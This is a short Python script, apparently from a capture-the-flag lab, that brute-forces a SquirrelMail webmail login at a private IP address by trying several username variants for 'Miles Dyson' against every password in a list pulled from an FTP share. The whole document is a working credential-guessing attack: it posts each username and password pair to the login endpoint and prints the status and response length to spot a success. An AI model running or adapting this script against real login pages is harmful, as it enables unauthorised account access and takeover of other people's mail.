import requests 

with open('./from_ftp/log1.txt') as f:
    pwds = f.readlines()

usernames = ["Miles Dyson", "milesdyson", "m.dyson", "dysonmiles", "m-dyson"]
s = requests.Session()

for username in usernames:
    for pwd in pwds:
        pwd = pwd.strip()
        data = {
            "login_username": username,
            "secretkey": pwd,
            "js_autodetect_results": "1",
            "just_logged_in": "1"
        }
        r = s.post('http://10.10.14.212/squirrelmail/src/redirect.php',
                   data=data)
        print(f"{username}:{pwd} -> {r.status_code}, {len(r.text)}")

